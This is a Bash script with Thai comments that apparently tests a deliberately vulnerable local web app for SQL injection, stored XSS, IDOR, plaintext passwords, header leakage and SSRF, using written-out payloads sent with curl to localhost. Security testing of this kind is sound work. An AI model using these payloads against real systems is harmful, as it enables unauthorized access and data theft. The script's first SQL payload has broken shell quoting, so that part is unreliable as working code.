#!/bin/bash

# สีสำหรับแสดงผล
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# ฟังก์ชันสำหรับแสดงผลการทดสอบ
print_result() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}[✓] $2${NC}"
    else
        echo -e "${RED}[✗] $2${NC}"
    fi
}

# ทดสอบ SQL Injection
test_sql_injection() {
    echo -e "\n${BLUE}=== ทดสอบ SQL Injection ===${NC}"
    
    # ทดสอบ 1: Basic SQL Injection
    response=$(curl -s -X POST http://localhost:3000/login \
        -H "Content-Type: application/json" \
        -d '{"username":"admin\' --","password":"anything"}')
    
    if [[ $response == *"success\":true"* ]]; then
        print_result 0 "SQL Injection พื้นฐาน (admin' --)"
    else
        print_result 1 "SQL Injection พื้นฐาน (admin' --)"
    fi
    
    # ทดสอบ 2: Union-based SQL Injection
    response=$(curl -s -X POST http://localhost:3000/login \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"' UNION SELECT 1,'admin','pass','admin'--\",\"password\":\"anything\"}")
    
    if [[ $response == *"success\":true"* ]]; then
        print_result 0 "UNION-based SQL Injection"
    else
        print_result 1 "UNION-based SQL Injection"
    fi
}

# ทดสอบ XSS
test_xss() {
    echo -e "\n${BLUE}=== ทดสอบ Cross-Site Scripting ===${NC}"
    
    # ทดสอบ 1: Basic XSS
    response=$(curl -s -X POST http://localhost:3000/messages \
        -H "Content-Type: application/json" \
        -d "{\"message\":\"<script>alert('xss')</script>\"}")
    
    if [[ $response == *"success\":true"* ]]; then
        print_result 0 "XSS พื้นฐาน (<script>alert)</script>)"
    else
        print_result 1 "XSS พื้นฐาน (<script>alert)</script>)"
    fi
    
    # ทดสอบ 2: Stored XSS
    response=$(curl -s -X POST http://localhost:3000/messages \
        -H "Content-Type: application/json" \
        -d "{\"message\":\"<img src=x onerror=alert('xss')>\"}")
    
    if [[ $response == *"success\":true"* ]]; then
        print_result 0 "Stored XSS (img onerror)"
    else
        print_result 1 "Stored XSS (img onerror)"
    fi
}

# ทดสอบ IDOR
test_idor() {
    echo -e "\n${BLUE}=== ทดสอบ Insecure Direct Object References ===${NC}"
    
    # ทดสอบเข้าถึงข้อความส่วนตัวของ admin
    response=$(curl -s http://localhost:3000/messages/1)
    
    if [[ $response == *"Admin"* ]]; then
        print_result 0 "IDOR - เข้าถึงข้อความของ Admin สำเร็จ"
    else
        print_result 1 "IDOR - ไม่สามารถเข้าถึงข้อความของ Admin"
    fi
}

# ทดสอบ Cryptographic Failures
test_crypto() {
    echo -e "\n${BLUE}=== ทดสอบ Cryptographic Failures ===${NC}"
    response=$(curl -s -X POST http://localhost:3000/register \
        -H "Content-Type: application/json" \
        -d '{"username":"test","password":"password123"}')
    
    if [[ $response == *"password"* ]]; then
        print_result 0 "พบรหัสผ่านที่ไม่ได้เข้ารหัส"
    else
        print_result 1 "ไม่พบรหัสผ่านที่ไม่ได้เข้ารหัส"
    fi
}

# ทดสอบ Security Misconfiguration
test_misconfig() {
    echo -e "\n${BLUE}=== ทดสอบ Security Misconfiguration ===${NC}"
    response=$(curl -sI http://localhost:3000)
    
    if [[ $response == *"X-Powered-By: Express"* ]]; then
        print_result 0 "พบ Server Information Leakage"
    else
        print_result 1 "ไม่พบ Server Information Leakage"
    fi
}

# ทดสอบ SSRF
test_ssrf() {
    echo -e "\n${BLUE}=== ทดสอบ Server-Side Request Forgery ===${NC}"
    response=$(curl -s "http://localhost:3000/fetch-data?url=http://localhost:3000/admin")
    
    if [[ $response == *"admin"* ]]; then
        print_result 0 "SSRF - สามารถเข้าถึง internal endpoint"
    else
        print_result 1 "SSRF - ไม่สามารถเข้าถึง internal endpoint"
    fi
}

# เริ่มการทดสอบ
case "$1" in
    "sql")
        test_sql_injection
        ;;
    "xss")
        test_xss
        ;;
    "idor")
        test_idor
        ;;
    "crypto")
        test_crypto
        ;;
    "misconfig")
        test_misconfig
        ;;
    "ssrf")
        test_ssrf
        ;;
    *)
        echo -e "${BLUE}=== เริ่มการทดสอบช่องโหว่ทั้งหมด ===${NC}"
        test_sql_injection
        test_xss
        test_idor
        test_crypto
        test_misconfig
        test_ssrf
        ;;
esac
